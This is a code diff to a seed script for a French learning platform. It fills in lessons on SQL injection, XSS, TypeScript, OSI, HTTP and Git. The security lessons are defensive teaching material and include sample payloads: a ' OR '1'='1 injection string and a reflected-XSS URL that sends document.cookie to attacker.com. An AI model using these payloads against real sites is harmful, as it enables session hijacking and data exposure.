@@ -112,7 +112,7 @@ async function main() {
       iconUrl: "/badges/xp-1000.svg",
       rarity: "EPIC",
       criterionType: "XP_THRESHOLD",
-      criterionData: { xp: 1000 },
+      criterionData: { threshold: 1000 },
     },
     {
       refCode: "CL-BDG-006",
@@ -148,7 +148,8 @@ async function main() {
       iconUrl: "/badges/legend.svg",
       rarity: "LEGENDARY",
       criterionType: "XP_THRESHOLD",
-      criterionData: { level: 50 },
+      // cumulativeXpForLevel(50) = 50 * 50 * 49 = 122 500
+      criterionData: { threshold: 122500 },
     },
     {
       refCode: "CL-BDG-010",
@@ -164,7 +165,7 @@ async function main() {
     await prisma.badge.upsert({
       where: { refCode: badge.refCode },
       create: badge,
-      update: {},
+      update: { criterionType: badge.criterionType, criterionData: badge.criterionData },
     });
   }
   console.log("✅ Badges seeded");
@@ -180,8 +181,53 @@ async function main() {
       difficulty: "BEGINNER",
       estimatedMinutes: 30,
       xpReward: 100,
-      contentMdx:
-        "# Introduction aux injections SQL\n\nDans cette leçon, vous allez découvrir l'une des vulnérabilités web les plus répandues.\n\n## Qu'est-ce qu'une injection SQL ?\n\nUne injection SQL est une attaque qui consiste à insérer du code SQL malveillant dans une requête...",
+      contentMdx: `# Introduction aux injections SQL
+
+Une injection SQL est l'une des vulnérabilités web les plus répandues et les plus dangereuses. Elle figure régulièrement dans le top 3 de l'OWASP Top 10.
+
+## Qu'est-ce qu'une injection SQL ?
+
+Une injection SQL (SQLi) survient lorsqu'un attaquant insère du code SQL malveillant dans une requête. Si l'application ne valide pas ses entrées, la base de données exécutera le code injecté.
+
+## Exemple concret
+
+Voici du code PHP **vulnérable** :
+
+\`\`\`php
+$query = "SELECT * FROM users WHERE email = '" . $_GET['email'] . "'";
+\`\`\`
+
+Si l'attaquant soumet \`' OR '1'='1\`, la requête devient :
+
+\`\`\`sql
+SELECT * FROM users WHERE email = '' OR '1'='1'
+\`\`\`
+
+Comme \`'1'='1'\` est toujours vrai, **tous** les utilisateurs sont retournés.
+
+## La solution : les requêtes paramétrées
+
+\`\`\`php
+$stmt = $pdo->prepare("SELECT * FROM users WHERE email = ?");
+$stmt->execute([$_GET['email']]);
+\`\`\`
+
+Les données utilisateur ne sont jamais interprétées comme du code SQL.
+
+## Types d'injections SQL
+
+- **In-band SQLi** — le résultat est renvoyé directement dans la réponse HTTP
+- **Blind SQLi** — pas de retour direct ; l'attaquant observe les temps de réponse ou les erreurs
+- **Out-of-band SQLi** — extraction via un canal secondaire (DNS, HTTP sortant)
+
+## Bonnes pratiques
+
+1. Utiliser des requêtes paramétrées **systématiquement**
+2. Appliquer le principe du moindre privilège sur les comptes de base de données
+3. Ne jamais afficher les erreurs SQL en production
+4. Activer les logs de la base de données pour détecter les tentatives
+
+> **À retenir :** les requêtes paramétrées séparent structurellement le code SQL des données. C'est la seule protection réellement fiable.`,
       authorId: ADMIN_ID,
       status: "PUBLISHED",
       publishedAt: new Date(),
@@ -196,8 +242,62 @@ async function main() {
       difficulty: "INTERMEDIATE",
       estimatedMinutes: 45,
       xpReward: 150,
-      contentMdx:
-        "# Cross-Site Scripting (XSS)\n\nLe XSS est une vulnérabilité permettant à un attaquant d'injecter du code côté client...",
+      contentMdx: `# Cross-Site Scripting (XSS)
+
+Le XSS permet à un attaquant d'injecter du JavaScript malveillant dans une page web, qui s'exécute dans le navigateur de la victime.
+
+## Types de XSS
+
+### XSS Réfléchi (Reflected)
+
+L'injection n'est pas stockée. Elle transite dans une URL et s'exécute immédiatement :
+
+\`\`\`
+https://example.com/search?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
+\`\`\`
+
+### XSS Stocké (Stored / Persistent)
+
+L'injection est sauvegardée en base de données (commentaire, profil…) et s'exécute pour **chaque visiteur** de la page.
+
+### XSS basé sur le DOM
+
+L'injection modifie le DOM côté client sans passer par le serveur.
+
+## Impact
+
+Un XSS peut permettre de :
+- **Voler des cookies de session** → usurpation d'identité
+- **Keylogging** → capture des frappes clavier
+- **Redirection** → phishing
+- **Défacement** → modification visuelle de la page
+
+## Protections
+
+\`\`\`html
+<!-- Mauvais : injection directe de données non filtrées -->
+<p>Bienvenue <?= $_GET['name'] ?></p>
+
+<!-- Bon : encodage HTML -->
+<p>Bienvenue <?= htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8') ?></p>
+\`\`\`
+
+En React / Next.js, JSX encode automatiquement les variables — la protection est intégrée :
+
+\`\`\`tsx
+// Sûr : React encode le HTML automatiquement
+<p>Bienvenue {name}</p>
+\`\`\`
+
+## Content Security Policy (CSP)
+
+Le header CSP limite les sources de scripts autorisées :
+
+\`\`\`
+Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
+\`\`\`
+
+> **À retenir :** toujours encoder les sorties et définir une CSP stricte.`,
       authorId: ADMIN_ID,
       status: "PUBLISHED",
       publishedAt: new Date(),
@@ -212,8 +312,89 @@ async function main() {
       difficulty: "INTERMEDIATE",
       estimatedMinutes: 40,
       xpReward: 120,
-      contentMdx:
-        "# TypeScript : les génériques\n\nLes génériques permettent d'écrire des fonctions et classes qui fonctionnent avec n'importe quel type...",
+      contentMdx: `# TypeScript : les génériques
+
+Les génériques permettent d'écrire des fonctions, classes et interfaces qui fonctionnent avec **n'importe quel type** tout en restant type-safe.
+
+## Problème sans génériques
+
+\`\`\`typescript
+// Trop restrictif : ne fonctionne qu'avec des nombres
+function identity(value: number): number {
+  return value;
+}
+
+// Trop permissif : perd l'information de type
+function identity(value: unknown): unknown {
+  return value;
+}
+\`\`\`
+
+## La solution : les génériques
+
+\`\`\`typescript
+function identity<T>(value: T): T {
+  return value;
+}
+
+const num = identity(42);        // T = number
+const str = identity("bonjour"); // T = string
+\`\`\`
+
+## Contraintes sur les génériques
+
+Vous pouvez restreindre T avec \`extends\` :
+
+\`\`\`typescript
+function getLength<T extends { length: number }>(value: T): number {
+  return value.length;
+}
+
+getLength("bonjour"); // ✓
+getLength([1, 2, 3]); // ✓
+getLength(42);        // ✗ Error: number n'a pas de propriété length
+\`\`\`
+
+## Interfaces génériques
+
+\`\`\`typescript
+interface ApiResponse<T> {
+  data: T;
+  status: number;
+  message: string;
+}
+
+type UserResponse = ApiResponse<User>;
+type LessonResponse = ApiResponse<Lesson[]>;
+\`\`\`
+
+## Génériques avec plusieurs paramètres
+
+\`\`\`typescript
+function merge<T, U>(obj1: T, obj2: U): T & U {
+  return { ...obj1, ...obj2 };
+}
+
+const result = merge({ name: "Alice" }, { age: 30 });
+// result: { name: string; age: number }
+\`\`\`
+
+## Cas d'usage réels
+
+\`\`\`typescript
+// useState en React est générique
+const [user, setUser] = useState<User | null>(null);
+
+// Fetch type-safe
+async function fetchData<T>(url: string): Promise<T> {
+  const res = await fetch(url);
+  return res.json() as Promise<T>;
+}
+
+const user = await fetchData<User>("/api/me");
+\`\`\`
+
+> **À retenir :** les génériques offrent la réutilisabilité du code \`any\` avec la sûreté du code typé fortement.`,
       authorId: ADMIN_ID,
       status: "PUBLISHED",
       publishedAt: new Date(),
@@ -228,8 +409,56 @@ async function main() {
       difficulty: "BEGINNER",
       estimatedMinutes: 25,
       xpReward: 80,
-      contentMdx:
-        "# Le modèle OSI\n\nLe modèle OSI (Open Systems Interconnection) est un cadre conceptuel qui divise les communications réseau en 7 couches...",
+      contentMdx: `# Le modèle OSI
+
+Le modèle OSI (Open Systems Interconnection) est un cadre conceptuel qui divise les communications réseau en **7 couches** indépendantes.
+
+## Les 7 couches
+
+| Couche | Nom | Rôle |
+|--------|-----|------|
+| 7 | Application | Protocoles HTTP, DNS, SMTP, FTP |
+| 6 | Présentation | Encodage, chiffrement, compression |
+| 5 | Session | Gestion des sessions de communication |
+| 4 | Transport | TCP / UDP — fiabilité et ports |
+| 3 | Réseau | Routage IP, adressage logique |
+| 2 | Liaison | MAC, commutateurs, trames |
+| 1 | Physique | Câbles, signaux électriques/optiques |
+
+## Pourquoi 7 couches ?
+
+Chaque couche a une **responsabilité unique** et communique uniquement avec les couches adjacentes. Cela permet :
+- De remplacer une technologie sans toucher les autres couches
+- D'isoler les problèmes lors du débogage réseau
+- D'interopérabilité entre équipements de constructeurs différents
+
+## Couches clés à retenir
+
+### Couche 3 — Réseau
+
+C'est ici que se fait le routage entre réseaux. Le protocole IP opère à ce niveau. Un **routeur** traite les paquets couche 3.
+
+### Couche 4 — Transport
+
+- **TCP** : connexion établie, livraison garantie et ordonnée (HTTP, SSH)
+- **UDP** : sans connexion, rapide, sans garantie (DNS, streaming, jeux)
+
+Les **ports** (80, 443, 22…) appartiennent à la couche 4.
+
+### Couche 7 — Application
+
+Protocoles directement utilisés par les applications :
+- **HTTP/HTTPS** : navigation web
+- **DNS** : résolution de noms
+- **SMTP/IMAP** : email
+
+## Mnémotechnique
+
+De bas en haut : **P**hysique, **L**iaison, **R**éseau, **T**ransport, **S**ession, **P**résentation, **A**pplication
+
+> _"Please Do Not Throw Sausage Pizza Away"_
+
+> **À retenir :** identifier la couche OSI d'un problème réseau est la première étape du diagnostic.`,
       authorId: ADMIN_ID,
       status: "PUBLISHED",
       publishedAt: new Date(),
@@ -244,8 +473,299 @@ async function main() {
       difficulty: "BEGINNER",
       estimatedMinutes: 30,
       xpReward: 90,
-      contentMdx:
-        "# HTTP/HTTPS\n\nHTTP (HyperText Transfer Protocol) est le protocole fondamental du web...",
+      contentMdx: `# HTTP/HTTPS : les fondamentaux
+
+HTTP (HyperText Transfer Protocol) est le protocole de communication fondamental du web. Il fonctionne en mode **requête / réponse** entre un client (navigateur) et un serveur.
+
+## Méthodes HTTP
+
+| Méthode | Usage | Idempotent |
+|---------|-------|-----------|
+| GET | Lire une ressource | ✓ |
+| POST | Créer une ressource | ✗ |
+| PUT | Remplacer une ressource | ✓ |
+| PATCH | Modifier partiellement | ✗ |
+| DELETE | Supprimer une ressource | ✓ |
+
+## Codes de statut
+
+\`\`\`
+2xx  Succès
+  200 OK
+  201 Created
+  204 No Content
+
+3xx  Redirection
+  301 Moved Permanently
+  302 Found (temporaire)
+  304 Not Modified
+
+4xx  Erreur client
+  400 Bad Request
+  401 Unauthorized
+  403 Forbidden
+  404 Not Found
+  429 Too Many Requests
+
+5xx  Erreur serveur
+  500 Internal Server Error
+  502 Bad Gateway
+  503 Service Unavailable
+\`\`\`
+
+## Headers importants
+
+\`\`\`http
+GET /api/user HTTP/1.1
+Host: api.example.com
+Authorization: Bearer eyJhbGci...
+Content-Type: application/json
+Accept: application/json
+\`\`\`
+
+## HTTP vs HTTPS
+
+| | HTTP | HTTPS |
+|-|------|-------|
+| Port | 80 | 443 |
+| Chiffrement | Aucun | TLS/SSL |
+| Certificat | Non | Oui (CA) |
+| Usage | Obsolète | Standard |
+
+HTTPS = HTTP + **TLS (Transport Layer Security)**
+
+Le chiffrement TLS garantit :
+1. **Confidentialité** — les données ne peuvent pas être lues par un tiers
+2. **Intégrité** — les données ne peuvent pas être modifiées en transit
+3. **Authentification** — le serveur est bien celui qu'il prétend être
+
+## Headers de sécurité essentiels
+
+\`\`\`http
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Content-Security-Policy: default-src 'self'
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+\`\`\`
+
+> **À retenir :** HTTPS est obligatoire en production. HTTP expose les données en clair sur le réseau.`,
+      authorId: ADMIN_ID,
+      status: "PUBLISHED",
+      publishedAt: new Date(),
+    },
+    // 6th PUBLISHED lesson
+    {
+      refCode: "CL-LSN-006-V01",
+      slug: "git-github-introduction",
+      title: "Introduction à Git & GitHub",
+      description:
+        "Maîtrisez les bases de Git pour versionner votre code et collaborer efficacement avec GitHub.",
+      category: "DEV",
+      difficulty: "BEGINNER",
+      estimatedMinutes: 35,
+      xpReward: 90,
+      contentMdx: `# Introduction à Git & GitHub
+
+Git est un système de **contrôle de version distribué** créé par Linus Torvalds en 2005. GitHub est une plateforme hébergeant des dépôts Git et ajoutant des outils de collaboration.
+
+## Concepts clés
+
+- **Dépôt (repository)** — répertoire versionné contenant l'historique complet du projet
+- **Commit** — instantané de l'état du projet à un moment donné
+- **Branche** — ligne de développement indépendante
+- **Merge** — fusion de deux branches
+
+## Commandes essentielles
+
+\`\`\`bash
+# Initialiser un dépôt
+git init
+
+# Cloner un dépôt existant
+git clone https://github.com/user/repo.git
+
+# Voir le statut des fichiers
+git status
+
+# Ajouter des fichiers au staging
+git add fichier.ts
+git add .            # Tout ajouter
+
+# Créer un commit
+git commit -m "feat: ajouter la page de connexion"
+
+# Voir l'historique
+git log --oneline
+\`\`\`
+
+## Travailler avec les branches
+
+\`\`\`bash
+# Créer et basculer sur une branche
+git checkout -b feat/nouvelle-fonctionnalite
+
+# Lister les branches
+git branch
+
+# Fusionner une branche dans main
+git checkout main
+git merge feat/nouvelle-fonctionnalite
+
+# Supprimer une branche fusionnée
+git branch -d feat/nouvelle-fonctionnalite
+\`\`\`
+
+## Workflow avec GitHub
+
+\`\`\`bash
+# Envoyer vos commits vers GitHub
+git push origin feat/ma-feature
+
+# Récupérer les changements distants
+git pull
+
+# Associer un dépôt distant
+git remote add origin https://github.com/user/repo.git
+\`\`\`
+
+## Conventions de messages de commit
+
+Un bon message de commit suit le format **Conventional Commits** :
+
+\`\`\`
+<type>(<scope>): <description>
+
+feat(auth): ajouter la connexion OAuth GitHub
+fix(api): corriger la pagination des leçons
+docs(readme): mettre à jour les instructions d'installation
+refactor(db): extraire la logique de connexion
+\`\`\`
+
+Types courants : \`feat\`, \`fix\`, \`docs\`, \`refactor\`, \`test\`, \`chore\`
+
+## .gitignore
+
+Le fichier \`.gitignore\` liste les fichiers à ne **pas** versionner :
+
+\`\`\`gitignore
+# Dépendances
+node_modules/
+
+# Builds
+.next/
+dist/
+
+# Variables d'environnement
+.env
+.env.local
+
+# IDE
+.vscode/
+.idea/
+\`\`\`
+
+> **À retenir :** commitez souvent, avec des messages descriptifs. Ne commitez jamais \`.env\` ni \`node_modules\`.`,
+      authorId: ADMIN_ID,
+      status: "PUBLISHED",
+      publishedAt: new Date(),
+    },
+    // DRAFT lessons
+    {
+      refCode: "CL-LSN-007-V01",
+      slug: "attaques-force-brute",
+      title: "Attaques par force brute",
+      description:
+        "Comprenez le fonctionnement des attaques par force brute et comment protéger vos systèmes.",
+      category: "CYBERSEC",
+      difficulty: "INTERMEDIATE",
+      estimatedMinutes: 35,
+      xpReward: 130,
+      contentMdx: `# Attaques par force brute
+
+> **Leçon en cours de rédaction** — disponible prochainement.`,
+      authorId: ADMIN_ID,
+      status: "DRAFT",
+    },
+    {
+      refCode: "CL-LSN-008-V01",
+      slug: "tcp-ip-en-profondeur",
+      title: "TCP/IP en profondeur",
+      description:
+        "Explorez la suite de protocoles TCP/IP et son rôle dans les communications Internet.",
+      category: "NETWORK",
+      difficulty: "INTERMEDIATE",
+      estimatedMinutes: 50,
+      xpReward: 140,
+      contentMdx: `# TCP/IP en profondeur
+
+> **Leçon en cours de rédaction** — disponible prochainement.`,
+      authorId: ADMIN_ID,
+      status: "DRAFT",
+    },
+    // Phase 4 demo — interactive components (Quiz + CodePlayground + Terminal)
+    {
+      refCode: "CL-LSN-009-V01",
+      slug: "python-interactif-demo",
+      title: "Python interactif : variables et types",
+      description:
+        "Découvrez les types de base en Python avec des exercices interactifs directement dans le navigateur.",
+      category: "DEV",
+      difficulty: "BEGINNER",
+      estimatedMinutes: 20,
+      xpReward: 80,
+      contentMdx: `# Python interactif : variables et types
+
+Python est un langage à typage dynamique. Chaque valeur a un type, mais tu n'as pas à le déclarer.
+
+## Les types de base
+
+| Type | Exemple | Description |
+|------|---------|-------------|
+| \`int\` | \`42\` | Entier |
+| \`float\` | \`3.14\` | Décimal |
+| \`str\` | \`"hello"\` | Chaîne de caractères |
+| \`bool\` | \`True\` | Booléen |
+
+## Essaye par toi-même
+
+Lance ce code et observe la sortie :
+
+<CodePlayground language="python" title="types.py">
+{\`x = 42
+y = 3.14
+nom = "CyberLearn"
+actif = True
+
+print(f"x est de type {type(x).__name__}")
+print(f"y est de type {type(y).__name__}")
+print(f"nom est de type {type(nom).__name__}")
+print(f"actif est de type {type(actif).__name__}")\`}
+</CodePlayground>
+
+## Exercice : affiche "Bonjour, monde !"
+
+Modifie le code ci-dessous pour afficher exactement \`Bonjour, monde !\` :
+
+<CodePlayground id="ex-hello" language="python" title="hello.py" expectedOutput="Bonjour, monde !" validate>
+{\`# Modifie cette ligne
+print("Hello, World!")\`}
+</CodePlayground>
+
+## Quiz de vérification
+
+<Quiz
+  id="quiz-types-1"
+  question="Quel type Python utilises-tu pour stocker le nombre 3.14 ?"
+  choices={["int", "float", "str", "bool"]}
+  correct={1}
+/>
+
+## Terminal Linux
+
+Explore les commandes de base dans ce terminal simulé :
+
+<SimulatedTerminal scenario="linux-basics" title="bash" />
+`,
       authorId: ADMIN_ID,
       status: "PUBLISHED",
       publishedAt: new Date(),
